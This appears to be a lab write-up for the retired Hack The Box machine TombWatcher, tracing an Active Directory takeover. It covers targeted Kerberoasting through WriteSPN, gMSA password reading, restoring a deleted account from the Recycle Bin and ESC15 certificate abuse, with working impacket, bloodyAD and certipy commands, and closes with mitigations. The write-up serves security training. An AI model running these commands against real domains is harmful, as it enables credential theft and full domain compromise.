---
machine: TombWatcher
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, kerberoasting, gmsa, recycle-bin, adcs-esc15]
---

# TombWatcher — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

With `henry` credentials, `WriteSPN` over `alfred` enables targeted Kerberoasting. `alfred` can join `INFRASTRUCTURE`, a group that reads a gMSA password. A deleted account is restored from the AD Recycle Bin and ESC15 is abused to issue an Administrator certificate.

## Recon

```bash
nmap -Pn -sC -sV -p53,88,135,139,389,445,464,593,636,3268,5985,9389 <IP>
```

- Domain controller with Kerberos, LDAP, SMB and WinRM.
- Initial `henry` credentials provided by the scenario.

## Enumeration

BloodHound shows that `henry` has `WriteSPN` over `alfred`.

```bash
bloodhound-python -u henry -p '<PASSWORD>' -d tombwatcher.htb -ns <IP> -c All
```

The permission allows assigning a temporary SPN to `alfred` and requesting a TGS for offline cracking.

```bash
impacket-GetUserSPNs tombwatcher.htb/henry:'<PASSWORD>' -dc-ip <IP> -request-user alfred
hashcat -m 13100 alfred.tgs wordlist.txt
```

## Lateral movement

`alfred` can add itself to the `INFRASTRUCTURE` group. Members of that group can read the password of the `ansible_dev$` managed service account.

```bash
bloodyAD -d tombwatcher.htb -u alfred -p '<PASSWORD>' --host <IP> add groupMember INFRASTRUCTURE alfred
nxc ldap <IP> -u alfred -p '<PASSWORD>' --gmsa
```

## Privilege escalation

The `cert_admin` account was deleted but remains in the AD Recycle Bin. It is restored, its password is reset and it is used to enumerate ADCS. The `WebServer` template is vulnerable to ESC15 (CVE-2024-49019); a certificate with Administrator's UPN is requested.

```bash
bloodyAD -d tombwatcher.htb -u alfred -p '<PASSWORD>' --host <IP> restore cert_admin
bloodyAD -d tombwatcher.htb -u alfred -p '<PASSWORD>' --host <IP> set password cert_admin '<NEW_PASSWORD>'
certipy find -u cert_admin@tombwatcher.htb -p '<NEW_PASSWORD>' -dc-ip <IP> -vulnerable
certipy req -u cert_admin@tombwatcher.htb -p '<NEW_PASSWORD>' -ca <CA> -template WebServer -upn administrator@tombwatcher.htb
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

The certificate authenticates as Administrator and yields the domain hash.

## Evidence

- BloodHound output showing `WriteSPN`.
- Requested TGS, hash redacted.
- gMSA read and `cert_admin` restoration.
- ESC15 template and issued certificate, without real material.
- Redacted flag.

## Lessons learned

- `WriteSPN` is enough for targeted Kerberoasting.
- Deleted accounts may remain in the AD Recycle Bin.
- ESC15 can influence a certificate UPN without a classic ESC1 template.

## Mitigations and detection

- Restrict `WriteSPN` and review service-account ACLs.
- Limit who can read gMSAs and audit group changes.
- Protect the AD Recycle Bin and monitor restores.
- Audit ADCS templates and apply ESC15 updates.

## References

- <https://www.hackthebox.com/machines/tombwatcher>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-49019>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin>
- <https://attack.mitre.org/techniques/T1558/003/>
